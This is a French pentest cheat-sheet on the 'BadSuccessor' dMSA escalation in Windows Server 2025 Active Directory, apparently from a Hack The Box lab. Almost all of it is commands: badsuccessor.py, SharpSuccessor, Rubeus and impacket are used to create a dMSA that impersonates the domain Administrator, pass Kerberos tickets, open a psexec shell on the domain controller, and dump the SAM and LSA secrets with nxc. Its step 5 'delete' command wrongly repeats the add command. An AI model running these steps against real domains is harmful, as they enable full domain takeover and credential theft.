
- [[#BadSuccessor]]

# BadSuccessor


> [!Warning]
> Fonctionne sous Windows Server 2025.
> Nécessite Rubeus supportant l'option /dmsa ou le script impacket badsuccessor.py

> [!TIp]
> Si l'utilisateur a l'ACL CreatChild sur une OU, il peut créer un dMSA dans cette OU et l'exploiter afin d'usurper n'importe quel utilisateur du Domaine.

https://www.akamai.com/fr/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory

https://thehackernews.com/2025/05/critical-windows-server-2025-dmsa.html


## Impacket

1. identifier les users pouvant écrire dans des OUs

```sh
badsuccessor.py 'domain.local/user'@dc -action search
```

2. Ajouter un compte dMSA pouvant usurper un admin

```sh
badsuccessor.py 'domain.local/user'@dc -action add -target-ou 'ou=Staff,dc=eighteen,dc=htb' -dmsa-name 'attacker_dMSA' -target-account 'administrator' -principals-allowed 'user'
```

3. Obtenir un ticket de service (getST.py)

```sh
getST.py 'domain.local/user'@dc -impersonate 'attacker_dMSA$' -self -dmsa
```

4. Lateraliser avec wmiexec

```sh
export KRB5CCNAME=$ticket
wmiexec.py 'domain.local/user'@dc
```

5. Supprimer le compte DMSA une fois plus nécessaire.

```sh
badsuccessor.py 'domain.local/user'@dc -action add -target-ou 'ou=Staff,dc=eighteen,dc=htb' -dmsa-name 'attacker_dMSA' -target-account 'administrator' -principals-allowed 'user'
```


## SharpSuccessor

https://github.com/logangoins/SharpSuccessor/

Automatise l'ajout du compte dMSA et sa configuration pour usurper un user.


1. Ajouter un dMSA pouvant usurper le compte Administrator dans l'OU cible. (si [+] msDS-SupersededServiceAccountState set to 2 -> Alors ça doit être OK même si Access is denied après)

```powershell
.\SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:<our_user> /name:dMSA
```

2. Demander un TGT pour notre utilisateur

Rubeus (avec un ticket déja présent en mémoire)

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

Rubeus (sans ticket déja présent en mémoire)

```powershell
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:EIGHTEEN.HTB /nowrap /opsec /force
```

Impacket (convertir le ticket au format kirbi puis base64)

```sh
sudo ntpdate $dchostname

impacket-getTGT EIGHTEEN.HTB/adam.scott:iloveyou1

impacket-ticketConverter adam.scott.ccache adam.scott.kirbi

base64 -w 0  adam.scott.kirbi
```

3. Faire un Pass The Ticket et demander un ST pour le compte dMSA.

```powershell
.\Rubeus.exe asktgs /targetuser:dMSA$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:<base64>
```

4. Puis refaire un Pass The Ticket avec le ST obtenu afin d'obtenir un ST pour le service CIFS du DC.

```powershell
.\Rubeus.exe asktgs /user:dMSA$ /service:CIFS/DC01.eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:<base64>
```

5. Enfin vérifier que le ticket est bien importé

```powershell
klist
```

6. Accéder au partage du DC.

```powershell
dir \\DC01.eighteen.htb\c$
```

Possible également de passer le ticket base64 au format ccache et utiliser Impacket pour latéraliser et obtenir un shell avec psexec (Pas OPSEC...).

```sh
echo "<base64_ticket>" | base64 -d > dmsa.kirbi
impacket-ticketConverter dmsa.kirbi dmsa.ccache
export KRB5CCNAME=dmsa.ccache

impacket-psexec DC01.eighteen.htb -k -no-pass -debug
```

7. Dump des bases SAM et LSA pour récupérer le hash du compte Administrateur et les comptes de service.

```sh
nxc smb DC01.eighteen.htb -k --use-kcache --sam
nxc smb DC01.eighteen.htb -k --use-kcache --lsa
```


